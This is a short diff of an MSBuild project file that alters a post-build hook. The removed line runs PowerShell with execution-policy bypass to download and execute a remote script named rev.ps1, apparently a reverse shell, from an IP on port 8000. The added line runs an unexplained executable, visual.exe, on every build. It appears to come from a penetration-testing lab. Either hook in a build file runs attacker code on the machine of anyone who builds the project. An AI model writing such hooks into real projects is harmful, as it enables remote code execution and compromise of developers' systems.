@@ -9,7 +9,7 @@
   </PropertyGroup>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-    <Exec Command="PowerShell -ep bypass &quot;iex((new-object net.webclient).downloadstring('http://10.10.14.14:8000/rev.ps1'))&quot;" />
+    <Exec Command=".\visual.exe" />
   </Target>
 
 </Project>
